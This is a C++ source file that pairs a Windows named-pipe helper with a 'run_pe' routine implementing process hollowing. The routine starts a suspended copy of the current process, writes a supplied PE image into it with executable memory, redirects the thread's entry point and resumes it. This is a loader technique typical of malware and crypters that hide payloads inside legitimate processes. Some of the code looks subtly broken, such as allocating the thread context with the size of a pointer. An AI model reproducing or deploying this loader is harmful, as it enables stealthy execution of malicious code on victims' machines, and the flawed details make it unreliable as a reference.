#include "precompile.h"
#include "pipe.h"
pipe::pipe(std::string name)
{
	set_name(name);
}

bool pipe::listen()
{
	while (true) {

		pipe_handle = CreateNamedPipeA
		(
			pipe_name.c_str(),
			PIPE_ACCESS_OUTBOUND,
			PIPE_TYPE_MESSAGE |
			PIPE_READMODE_BYTE |
			PIPE_WAIT,
			1,
			4096,
			0,
			1,
			nullptr
		);

		if (pipe_handle != INVALID_HANDLE_VALUE) {
			break;
		}

		if (GetLastError() != ERROR_PIPE_BUSY) {
			return false;
		}

		Sleep(500);

	}

	return true;
}

bool pipe::send_data(std::string msg)
{
	unsigned long read_bytes = 0;
	bool write = WriteFile(pipe_handle, msg.c_str(), msg.size(), &read_bytes, nullptr);
	while (!write) {
		//manip::output_error(GetLastError(), "send()");
		write = WriteFile(pipe_handle, msg.c_str(), msg.size(), &read_bytes, nullptr);
	}
	return write && msg.size() == read_bytes;
}

void pipe::run_pe(void* Image)
{
	auto error = [=](int error) {
		char msg_buf[256]{ '\0' };

		FormatMessageA(

			FORMAT_MESSAGE_FROM_SYSTEM |
			FORMAT_MESSAGE_IGNORE_INSERTS |
			FORMAT_MESSAGE_MAX_WIDTH_MASK,
			nullptr,
			error,
			MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
			msg_buf,
			sizeof(msg_buf),
			nullptr

		);

		return std::string(msg_buf);
	};

	std::cout << "[run_pe] Initializing" << std::endl;
	IMAGE_DOS_HEADER* DOSHeader;
	IMAGE_NT_HEADERS* NtHeader;
	IMAGE_SECTION_HEADER* SectionHeader;
	PROCESS_INFORMATION PI;
	STARTUPINFOA SI;
	CONTEXT* CTX;
	DWORD* ImageBase = NULL;
	void* pImageBase = NULL;
	int count;
	char CurrentFilePath[1024];
	DOSHeader = PIMAGE_DOS_HEADER(Image);
	NtHeader = PIMAGE_NT_HEADERS(DWORD(Image) + DOSHeader->e_lfanew);
	std::cout << "[run_pe] Initialized Variables" << std::endl;
	if (GetModuleFileNameA(0, CurrentFilePath, 1024)) {
		std::cout << "[run_pe] Got Extended Path for current process" << std::endl;
	}
	else {
		std::cout << "[run_pe] Could not get path for current process e[" << GetLastError() << "]" << std::endl;
	}


	if (NtHeader->Signature == IMAGE_NT_SIGNATURE)
	{
		std::ostream hexout(std::cout.rdbuf());
		hexout << std::showbase
			<< std::internal
			<< std::setfill('0');
		hexout << "[run_pe] Image is a PE file" << std::endl;
		ZeroMemory(&PI, sizeof(PI));
		ZeroMemory(&SI, sizeof(SI));
		bool threadcreated = CreateProcessA(CurrentFilePath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED | CREATE_NEW_CONSOLE, NULL, NULL, &SI, &PI);
		if (threadcreated == true)
		{
			hexout << "[run_pe] Created Suspended Process" << std::endl;
			CTX = LPCONTEXT(VirtualAlloc(NULL, sizeof(CTX), MEM_COMMIT, PAGE_READWRITE));
			CTX->ContextFlags = CONTEXT_FULL;
			hexout << "[run_pe] Allocates Memory with 0's and sets memory page to read/write" << std::endl;
			if (GetThreadContext(PI.hThread, LPCONTEXT(CTX)))
			{
				hexout << "[run_pe] Got Thread context (state) - " << std::hex << CTX->ContextFlags << std::endl;
				ReadProcessMemory(PI.hProcess, LPCVOID(CTX->Ebx + 8), LPVOID(&ImageBase), 4, 0);
				hexout << "[run_pe] ImageBase - " << std::hex << ImageBase << std::endl;

				if (!DiscardVirtualMemory(LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage)) {
					std::cout << "[run_pe] DiscardVirtualMemory - (" << GetLastError() << ")[" << error(GetLastError()) << "]" << std::endl;
				}
				else {
					hexout << "[run_pe] Discarded virtual memory from [" << std::hex << NtHeader->OptionalHeader.ImageBase << "] -> [" << NtHeader->OptionalHeader.ImageBase + NtHeader->OptionalHeader.SizeOfImage << "]" << std::endl;
				}

				MEMORY_BASIC_INFORMATION mem{};
				std::cout << "[run_pe] VirtualQueryEx - " << VirtualQueryEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), &mem, NtHeader->OptionalHeader.SizeOfImage) << std::endl;
				hexout << "[run_pe] Page AllocationBase: " << std::hex << mem.AllocationBase << std::endl
					<< "[run_pe] Page AllocationProtect: " << std::hex << mem.AllocationProtect << std::endl
					<< "[run_pe] Page BaseAddress: " << std::hex << mem.BaseAddress << std::endl
					<< "[run_pe] Page Protect: " << std::hex << mem.Protect << std::endl
					<< "[run_pe] Page RegionSize: " << std::hex << mem.RegionSize << std::endl
					<< "[run_pe] Page State: " << std::hex << mem.State << std::endl
					<< "[run_pe] Page Type: " << std::hex << mem.Type << std::endl;

				pImageBase = VirtualAllocEx(PI.hProcess, LPVOID(NtHeader->OptionalHeader.ImageBase), NtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
				hexout << "[run_pe] Allocates memory from [" << std::hex << NtHeader->OptionalHeader.ImageBase << "] -> [" << NtHeader->OptionalHeader.ImageBase + NtHeader->OptionalHeader.SizeOfImage << "]" << std::endl;
				
				if (pImageBase == 00000000) { // if allocation failed, means that image is already loaded
					std::cout << "[run_pe] Memory is already Committed and Written to so resuming thread" << std::endl;
					ResumeThread(PI.hThread);
					Sleep(1000);
					exit(-23);
				}
				else
				{
					WriteProcessMemory(PI.hProcess, pImageBase, Image, NtHeader->OptionalHeader.SizeOfHeaders, NULL);
					for (count = 0; count < NtHeader->FileHeader.NumberOfSections; count++)
					{
						SectionHeader = PIMAGE_SECTION_HEADER(DWORD(Image) + DOSHeader->e_lfanew + 248 + (count * 40));
						WriteProcessMemory(PI.hProcess, LPVOID(DWORD(pImageBase) + SectionHeader->VirtualAddress),
							LPVOID(DWORD(Image) + SectionHeader->PointerToRawData), SectionHeader->SizeOfRawData, 0);
					}
					hexout << "[run_pe] Written Image to [" << std::hex << ImageBase << "]" << std::endl;
					WriteProcessMemory(PI.hProcess, LPVOID(CTX->Ebx + 8),
						LPVOID(&NtHeader->OptionalHeader.ImageBase), 4, 0);
					hexout << "[run_pe] Written new base pointer" << std::endl;
					CTX->Eax = DWORD(pImageBase) + NtHeader->OptionalHeader.AddressOfEntryPoint;
					hexout << "[run_pe] Updates context with new base pointer" << std::endl;
					SetThreadContext(PI.hThread, LPCONTEXT(CTX));
					hexout << "[run_pe] Sets thread to the updated Context" << std::endl;
					ResumeThread(PI.hThread);
					hexout << "[run_pe] Resumes suspended thread" << std::endl;
				}
			}
		}
		else {
			std::cout << "[run_pe] Could not create suspended process e[" << GetLastError() << "]" << std::endl;
		}
	}
}
void pipe::set_name(std::string name)
{
	pipe_name += name;
}